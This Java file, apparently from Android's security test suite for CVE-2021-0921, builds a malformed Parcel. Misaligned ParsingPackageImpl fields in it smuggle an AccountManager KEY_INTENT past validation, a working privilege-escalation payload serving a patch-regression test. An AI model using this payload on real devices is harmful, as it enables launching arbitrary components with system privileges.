package android.security.cts.CVE_2021_0921;

import android.accounts.AccountManager;
import android.content.Intent;
import android.os.Binder;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class GenMalformedParcel {

    private static final String TAG = "TAG_2021_0921.GenMalformedParcel";

    public static Parcel parsingPackageImplParcel(Intent intent) {
        Log.d(TAG, "parsingPackageImplParcel() start");

        Parcel data = Parcel.obtain();
        data.writeInterfaceToken("android.accounts.IAccountAuthenticatorResponse");
        data.writeInt(1);
        int bundleLenPos = data.dataPosition();
        data.writeInt(0);
        data.writeInt(0x4C444E42);
        int bundleStartPos = data.dataPosition();
        data.writeInt(3);

        data.writeString("key1");
        data.writeInt(4);
        data.writeString("android.content.pm.parsing.ParsingPackageImpl");

        data.writeInt(0); // supportsSmallScreens
        data.writeInt(0); // supportsNormalScreens
        data.writeInt(0); // supportsLargeScreens
        data.writeInt(0); // supportsExtraLargeScreens
        data.writeInt(0); // resizeable
        data.writeInt(0); // anyDensity
        data.writeInt(0); // versionCode
        data.writeInt(0); // versionCodeMajor
        data.writeInt(0); // baseRevisionCode
        data.writeString("versionName"); // versionName
        data.writeInt(0); // compileSdkVersion
        data.writeString("compileSdkVersionCodeName"); // compileSdkVersionCodeName
        data.writeString("packageName"); // packageName
        data.writeString("realPackage"); // realPackage
        data.writeString("baseCodePath"); // baseCodePath
        data.writeBoolean(false); // requiredForAllUsers
        data.writeString("restrictedAccountType"); // restrictedAccountType
        data.writeString("requiredAccountType"); // requiredAccountType
        data.writeString("overlayTarget"); // overlayTarget
        data.writeString("overlayTargetName"); // overlayTargetName
        data.writeString("overlayCategory"); // overlayCategory
        data.writeInt(0); // overlayPriority
        data.writeBoolean(false); // overlayIsStatic
        data.writeInt(0); // overlayables
        data.writeString("staticSharedLibName"); // staticSharedLibName
        data.writeLong(0); // staticSharedLibVersion
        data.writeInt(0); // libraryNames
        data.writeInt(0); // usesLibraries
        data.writeInt(0); // usesOptionalLibraries
        data.writeInt(0); // usesStaticLibraries
        data.writeInt(0); // usesStaticLibrariesVersions
        data.writeInt(0); // digestsSize
        data.writeString("sharedUserId"); // sharedUserId
        data.writeInt(0); // sharedUserLabel
        data.writeInt(0); // configPreferences
        data.writeInt(0); // reqFeatures
        data.writeInt(0); // featureGroups
        data.writeInt(0); // restrictUpdateHash
        data.writeInt(0); // originalPackages
        data.writeInt(0); // adoptPermissions
        data.writeInt(0); // requestedPermissions
        data.writeInt(0); // implicitPermissions
        data.writeInt(0); // upgradeKeySets
        data.writeInt(0); // keySetMapping
        data.writeInt(0); // protectedBroadcasts
        data.writeInt(0); // activities
        data.writeInt(0); // receivers
        data.writeInt(0); // services
        data.writeInt(0); // providers
        data.writeInt(0); // attributions
        data.writeInt(0); // permissions
        data.writeInt(0); // permissionGroups
        data.writeInt(0); // instrumentations
        data.writeInt(0); // preferredActivityFilters
        data.writeInt(0); // processes
        data.writeInt(0); // metaData
        data.writeString("volumeUuid"); // volumeUuid
        data.writeInt(-1); // signingDetails
        data.writeString("codePath"); // codePath
        data.writeBoolean(false); // use32BitAbi
        data.writeBoolean(false); // visibleToInstantApps
        data.writeBoolean(false); // forceQueryable

        data.writeInt(1); // queriesIntents
        data.writeInt(0); // queriesIntents

        data.writeInt(0); // queriesPackages
        data.writeInt(0); // queriesProviders
        data.writeString(""); // appComponentFactory
        data.writeString(""); // backupAgentName
        data.writeInt(-1); // banner
        data.writeInt(0); // category
        data.writeString(""); // classLoaderName
        data.writeString("className"); // className
        data.writeInt(-1); // compatibleWidthLimitDp
        data.writeInt(0); // descriptionRes
        data.writeBoolean(false); // enabled
        data.writeBoolean(false); // crossProfile
        data.writeInt(0); // fullBackupContent
        data.writeInt(0); // iconRes
        data.writeInt(0); // installLocation

        data.writeInt(0); // labelRes -> queriesPackages
        data.writeInt(0); // largestWidthLimitDp -> queriesProviders
        data.writeInt(-1); // logo -> appComponentFactory
        data.writeString("manageSpaceActivityName"); // manageSpaceActivityName -> backupAgentName
        data.writeFloat(0); // maxAspectRatio -> banner
        data.writeFloat(0); // minAspectRatio -> category
        data.writeInt(-1); // minSdkVersion -> classLoaderName
        data.writeInt(-1); // networkSecurityConfigRes -> className
        data.writeInt(1); // nonLocalizedLabel -> compatibleWidthLimitDp
        data.writeInt(-1); // nonLocalizedLabel -> descriptionRes
        data.writeInt(-1); // permission -> enabled
        data.writeInt(-1); // processName -> crossProfile
        data.writeInt(0); // requiresSmallestWidthDp -> fullBackupContent
        data.writeInt(0); // roundIconRes -> iconRes
        data.writeInt(0); // targetSandboxVersion -> installLocation
        data.writeInt(0); // targetSdkVersion -> labelRes
        data.writeInt(-1); // taskAffinity -> largestWidthLimitDp
        data.writeInt(0); // theme -> logo
        data.writeInt(-1); // uiOptions -> manageSpaceActivityName
        data.writeInt(-1);  // zygotePreloadName -> maxAspectRatio
        data.writeInt(0); // splitClassLoaderNames -> minAspectRatio
        data.writeInt(0); // splitCodePaths -> minSdkVersion
        data.writeInt(0); // splitDependencies -> networkSecurityConfigRes
        data.writeInt(0); // splitFlags -> nonLocalizedLabel
        data.writeInt(-1); // splitNames -> nonLocalizedLabel
        data.writeInt(-1); // splitRevisionCodes -> permission
        data.writeBoolean(false); // externalStorage -> processName
        data.writeBoolean(false); // baseHardwareAccelerated -> processName
        data.writeBoolean(true); // allowBackup -> requiresSmallestWidthDp
        data.writeBoolean(false); // killAfterRestore -> roundIconRes
        data.writeBoolean(false); // restoreAnyVersion -> targetSandboxVersion
        data.writeBoolean(false); // fullBackupOnly -> targetSdkVersion
        data.writeBoolean(false); // persistent -> taskAffinity
        data.writeBoolean(false); // debuggable -> taskAffinity
        data.writeBoolean(false); // vmSafeMode -> theme
        data.writeBoolean(false); // hasCode -> uiOptions
        data.writeBoolean(false); // allowTaskReparenting -> zygotePreloadName
        data.writeBoolean(false); // allowClearUserData -> zygotePreloadName
        data.writeBoolean(false); // largeHeap -> splitClassLoaderNames
        data.writeBoolean(false); // usesCleartextTraffic -> splitCodePaths
        data.writeBoolean(false); // supportsRtl -> splitDependencies
        data.writeBoolean(false); // testOnly -> splitFlags
        data.writeBoolean(false); // multiArch -> splitNames
        data.writeBoolean(false); // extractNativeLibs -> splitRevisionCodes
        data.writeBoolean(false); // game -> externalStorage
        data.writeBoolean(false); // resizeableActivity -> baseHardwareAccelerated
        data.writeBoolean(false); // staticSharedLibrary -> allowBackup
        data.writeBoolean(false); // overlay -> killAfterRestore
        data.writeBoolean(false); // isolatedSplitLoading -> restoreAnyVersion
        data.writeBoolean(false); // hasDomainUrls -> fullBackupOnly
        data.writeBoolean(false); // profileableByShell -> persistent
        data.writeBoolean(false); // backupInForeground -> debuggable
        data.writeBoolean(false); // useEmbeddedDex -> vmSafeMode
        data.writeBoolean(false); // defaultToDeviceProtectedStorage -> hasCode
        data.writeBoolean(false); // directBootAware -> allowTaskReparenting
        data.writeBoolean(false); // partiallyDirectBootAware -> allowClearUserData
        data.writeBoolean(false); // resizeableActivityViaSdkVersion -> largeHeap
        data.writeBoolean(false); // allowClearUserDataOnFailedRestore -> usesCleartextTraffic
        data.writeBoolean(false); // allowAudioPlaybackCapture -> supportsRtl
        data.writeBoolean(false); // requestLegacyExternalStorage -> testOnly
        data.writeBoolean(false); // usesNonSdkApi -> multiArch
        data.writeBoolean(false); // hasFragileUserData -> extractNativeLibs
        data.writeBoolean(false); // cantSaveState -> game
        data.writeBoolean(false); // allowNativeHeapPointerTagging -> resizeableActivity
        data.writeInt(0); // autoRevokePermissions -> staticSharedLibrary
        data.writeBoolean(false); // preserveLegacyExternalStorage -> overlay
        data.writeInt(0); // mimeGroups -> isolatedSplitLoading
        data.writeInt(0); // gwpAsanMode -> hasDomainUrls
        data.writeInt(0); // minExtensionVersions -> profileableByShell

        data.writeString("key2");
        data.writeInt(-1);

        data.writeString("key3");
        data.writeInt(13);
        int byteArrayLenPos = data.dataPosition();
        data.writeInt(0);
        int byteArrayStartPos = data.dataPosition();
        for (int i = 0; i < 7; i++) {
            data.writeInt(0);
        }
        data.writeString(AccountManager.KEY_INTENT);
        data.writeInt(4);
        data.writeString("android.content.Intent");
        intent.writeToParcel(data, 0);
        int byteArrayEndPos = data.dataPosition();
        data.setDataPosition(byteArrayLenPos);
        int byteArrayLen = byteArrayEndPos - byteArrayStartPos;
        data.writeInt(byteArrayLen);
        data.setDataPosition(byteArrayEndPos);
        int bundleEndPos = data.dataPosition();
        data.setDataPosition(bundleLenPos);
        int bundleLen = bundleEndPos - bundleStartPos;
        data.writeInt(bundleLen);
        data.setDataPosition(bundleEndPos);
        Log.d(TAG, "parsingPackageImplParcel() end");
        return data;
    }
}
